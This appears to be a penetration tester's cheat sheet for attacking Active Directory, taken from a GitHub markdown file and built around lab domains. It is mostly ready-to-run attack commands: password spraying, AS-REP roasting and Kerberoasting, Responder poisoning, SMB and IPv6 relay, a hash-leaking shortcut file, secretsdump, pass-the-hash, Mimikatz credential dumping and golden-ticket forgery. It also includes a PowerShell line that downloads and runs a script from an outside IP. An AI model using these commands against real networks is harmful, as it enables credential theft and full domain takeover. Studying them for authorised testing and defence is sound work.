Kerbrute
Only do usernames as to not lockout users
Located in my downloads
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.103.225 users.txt

For password spray - kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
Username grabbing
enum4linux -U DCIP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

Rpcclient - rpcclient -U ""-N 172.16.5.5 (only change IP)

crackmapexec smb 172.16.5.5 --users  (only change IP)(this is null session
If you have creds - sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL"-s sub "(&(objectclass=user))"|grep samAccountName: |cut-f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u ""-U  (only change IP)


Can now spray passwords with kerbrute - kerbrute passwordspray -d domain --dc IP validusers.txt Welcome1
For windows, import PowerView.ps1 and run Get-NetUser | select cn

Query Ticket auth with no password
take valid usernames from kerbrute and place into new user file
sudo python3 /home/kali/impacket/examples/GetNPUsers.py -dc-ip 10.10.103.225 spookysec.local/ -usersfile users.txt -format john -outputfile hashes
cat hashes - look for any usernames with hashes here to crack

To crack this with hashcat, you need to add a 23 to the hash between rep and name - so e.g $krb5asrep$23$asdas -  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
hashcat mode -m 18200

LLMNR Poisoning
fallback with share that is unknown, device reaches out with broadcast to see if any device knows the share, malicious machine asks for hash to direct user

Responder is used to capture the hashes (type locate responder to find the path) - python3 responder.py -I eth0 -rdwv
Run tool first thing in morning on a pen test and right after lunch

Next you'll want to crack the hashes - Hashcat runs better on normal PC and not VM due to using GPU. Copy whole hash, add to text file.
hashcat -m 5600 file.txt rockyou.txt --force ------ -m 5600 stands for AD hash NetNTLMv2

From Windows
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y


SMB Relay
Instead of cracking hashes from responder, can relay hashes to another machine. SMB signing has to be disabled on the target and relayed creds must be admin on machine.
to work have to go to responder.conf and turn off SMB and HTTP
Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support (add -i for interactive shell)

Can gain shell access with pw - run psexec (metasploit module) - need domain, user and pass, may need to try the module several times
Could also use - sudo python3 smbexec.py domain/username:'password'@IP
Or psexec.py domain/username:password@IP

Pass Back Attack
This is an LDAP attack (anything that uses LDAP to connect to AD such as printers)
on LDAP server address within the settings configuration if you change the IP address of the LDAP server to your machine and setup a listerner (responder or netcat) the password will be sent over in cleartext
Find webserver using LDAP connection and see if you can change the settings (default PW's on printers)
Force Hashes
If you already have a user account and can write to a share that has alot of popularity, you can create a file that uses a fake icon file linking back to your IP running responder
name the file "@something.url" and include contents
[InternetShortcut] URL=https://securify.nl IconIndex=0 IconFile=\\\leak\leak.ico
run responder and anyone who visits share will send hash

MITM6
github.com/got-it/mitm6
mitm6 -I eth0 -d domain.local
Now setup relay attack with ntlmrelayx - ntlmrelayx.py -6 -t ldaps://domainip -wh fakewpad.domain.local -l lootme


GPP Attacks
Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.
Download if accessible via SMB by authing to smb - using mget command - mget * to download all files
To decrypt cpassword - use tool call gpp-decrypt
https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

Further strats
Look for web portals that may have default creds, anything on there that shows AD creds?
Check GPO's or hardcoded creds within XML files etc
Look on printers

Post exploitation (already have creds)
Enumerating password policies with a valid account
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

Enumerating password policieis with NULL SMB sessions
rpcclient -U ""-N 172.16.5.5


Domain Enumeration with Powershell
. .\PowerView.ps1 (enter)
Get-NetDomain (enter)
Get-DomainPolicy
Get-NetUser (sometimes passwords are placed in Description) -- Get-NetUser | select description
Pass the password
crackmapexec smb IP/CIDR -u user -d domain -p password
This will loop through the IPs specified to see what devices the user can authenticate against.

Then use smbclient to look into shares
smbclient -L 172.16.7.50 -U AB920 -W inlanefreight.local
sudo smbmap -H 172.16.7.3 -u AB920 -p weasal -d domain -r 'Department Shares'
Pass the Hash
Crackmapexec IP -u username -H hash --local-auth

Find valid Domain Admins with lower account
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
Secrets Dump
Any machine that allows login via SMB perform a secrets dump on the machine to dump out the local hashes should the account be a administrator
secretsdump.py domain/username:password@ip
Kerboeroasting
Goal here is to get a TGS (Service Ticket) to decrypt servers account hash
python3 /home/kali/impacket/examples/GetUsersSPN.py domain/username:password -dc-ip IP -request
(doesnt always need password
Hashcat -m 13100 textfile.txt wordlist.txt

Kerbroasting from windows
Run Powerview (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString(' http://10.10.14.160:8000/PowerView.ps1')
Or download to my localmachine and do a wget across Wget http://server:port/address -outfile name.ps1
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

PrintNightmare
Use POC online - rpcdump.py

Token Impersonation
meterpreter - impersonate_token (use on machine a DA has a session)

Credential Dumping Mimikatz (use on machines where DA has logged into)
Mimikatz.exe
Run - privilage::debug
Run - sekurlsa::logonpasswords

Run - lsadump::lsa /patch (shows hashes etc)

can try - ntds.dit

golden ticket
Run mimikatz.exe
run - privilage::debug
run - lsadump::lsa /inject /name:krbtgt
copy SID of domain to notepad (shown next to Domain e.g. S-1-5-21-), copy NTLM hash and paste to notepad
run - kerberos::golden /User:Administrator /domain: /sid: /krbtgt:addhashhere /id:500 /ptt
Run - misc::cmd
run command

From <https://github.com/TobyDavenn/ActiveDirectory/blob/main/activedirectory.md> 


![image](https://user-images.githubusercontent.com/35967437/200788095-c9c95791-7229-472a-af91-4f677ec7ec08.png)
